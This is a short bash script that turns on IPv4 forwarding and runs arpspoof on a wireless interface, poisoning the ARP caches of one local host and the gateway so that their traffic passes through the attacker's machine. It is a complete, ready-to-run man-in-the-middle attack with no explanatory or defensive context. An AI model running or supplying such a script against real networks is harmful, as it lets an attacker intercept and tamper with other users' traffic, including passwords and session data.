#!/bin/bash

echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i wlan0 -r -t 192.168.1.106 192.168.1.1

exit 0
